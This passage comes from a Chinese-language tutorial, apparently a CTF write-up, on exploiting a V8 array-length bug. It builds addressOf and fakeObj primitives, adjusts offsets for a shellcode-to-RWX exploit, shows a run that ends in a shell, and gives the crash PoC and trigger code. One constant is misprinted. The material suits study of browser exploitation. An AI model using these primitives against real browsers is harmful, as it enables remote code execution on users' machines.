     - elements: 0x34f108904b89  {
               0: 0x34f108901c8d 
     }
    ......
    array_map = 0x80406e908241891
    obj_map = 0x80406e9082418e1
成功泄漏了map地址，不过该方法的缺点是，只要修改了js代码，堆布局就会发生一些变化，就需要修改`elements`的值，所以需要先把所有代码写好，不准备变的时候，再来修改一下这个值。
不过也还有一些方法，比如堆喷，比如把`elements`值设置的稍微小一点，然后在根据map的低20bit为0x891，来搜索map地址，不过这些方法本文不再深入研究，有兴趣的可以自行进行测试。
## 编写addressOf函数
现在我们能来编写addressOf函数了：
    function addressOf(obj_to_leak)
    {
        obj_array[0] = obj_to_leak;
        corrupted_array[4] = array_map; // 把obj数组的map地址改为浮点型数组的map地址
        let obj_addr = ftoi(obj_array[0]) - 1n;
        corrupted_array[4] = obj_map; // 把obj数组的map地址改回来，以便后续使用
        return obj_addr;
    }
## 编写fakeObj函数
接下来就是编写`fakeObj`函数：
    function fakeObj(addr_to_fake)
    {
        double_array[0] = itof(addr_to_fake + 1n);
        corrupted_array[0] = obj_map;  // 把浮点型数组的map地址改为对象数组的map地址
        let faked_obj = double_array[0];
        corrupted_array[0] = array_map; // 改回来，以便后续需要的时候使用
        return faked_obj;
    }
## 修改偏移
改版本中，需要修改的偏移有：
    $ cat exp1.js
    function copy_shellcode_to_rwx(shellcode, rwx_addr)
    {
    ......
    var buf_backing_store_addr_lo = addressOf(data_buf) + 0x10n;
    ......
    }
    ......
    fake_object_addr = fake_array_addr + 0x48n;
    ......
其他都模板中一样，最后运行`exp1`:
    $ ./d8 --allow-natives-syntax exp1.js
    array_map = 0x80406e908241891
    obj_map = 0x80406e9082418e1
    [*] leak fake_array addr: 0x8040a3d5962db08
    [*] leak wasm_instance addr: 0x8040a3d082116bc
    [*] leak rwx_page_addr: 0x28fd83851000
    [*] buf_backing_store_addr: 0x9c0027c000000000
    $ id
    uid=1000(ubuntu) gid=1000(ubuntu)
# 优化exp
前面内容通过套模板的方式，写出了`exp1`，但是却有些许不足，因为`elements`的值是根据我们本地环境测试出来的，即使在测试环境中，代码稍微变动，就需要修改，如果只是用来打CTF，我觉得这样就足够了。但是如果拿去实际的环境打，exp大概需要进行许多修改。
接下来，我将准备讲讲该漏洞原理，在理解其原理后，再来继续优化我们的exp。那为啥之前花这么长时间讲这个不太实用的exp？而不直接讲优化后的exp？因为我想表明，在只有PoC的情况下，也可以通过套模板，写出exp。
## 漏洞成因
漏洞成因这块我不打算花太多时间讲，因为我发现，V8更新的太快了，你花大量时间来分析这个版本的代码，分析这个漏洞的相关代码，但是换一个版本，会发现代码发生了改变，之前分析的已经过时了。所以我觉得起码在初学阶段，没必要深挖到最底层。
在bugs.chromium.org上已经很清楚了解释了该漏洞了。
`NewFixedArray`和`NewFixedDoubleArray`没有对数组的大小进行判断，来看看`NewFixedDoubleArray`修复后的代码，多了一个判断：
    macro NewFixedDoubleArray(
    ......
      if (length > kFixedDoubleArrayMaxLength) deferred {
          runtime::FatalProcessOutOfMemoryInvalidArrayLength(kNoContext);
        }
    ......
再去搜一搜源码，发现`kFixedDoubleArrayMaxLength = 671088612`，说明一个浮点型的数组，最大长度为`67108862`。
我们再来看看PoC：
    array = Array(0x40000).fill(1.1);
    args = Array(0x100 - 1).fill(array);
    args.push(Array(0x40000 - 4).fill(2.2));
    giant_array = Array.prototype.concat.apply([], args);
    giant_array.splice(giant_array.length, 0, 3.3, 3.3, 3.3);
我们来算算，`array`的长度为`0x40000`，`args`的为`0xff`个`array`，然后`args`还push了一个长度为`0x3fffc`的数组。
通过`Array.prototype.concat.apply`函数，把`args`变量变成了长度为`0x40000 * 0xff + 0x3fffc =
67108860`的变量`giant_array`。
接着再使用`splice`添加了3个值，该函数将会执行`NewFixedDoubleArray`函数，从而生成了一个长度为`67108860+3=67108863`的浮点型数组。
该长度已经超过了`kFixedDoubleArrayMaxLength`的值，那么改漏洞要怎么利用呢？
来看看`trigger`函数：
    function trigger(array) {
      var x = array.length;
      x -= 67108861;
      x = Math.max(x, 0);
      x *= 6;
      x -= 5;
      x = Math.max(x, 0);
      let corrupting_array = [0.1, 0.1];
      let corrupted_array = [0.1];
      corrupting_array[x] = length_as_double;
      return [corrupting_array, corrupted_array];
    }
    for (let i = 0; i 
  2. 
  3. 
* * *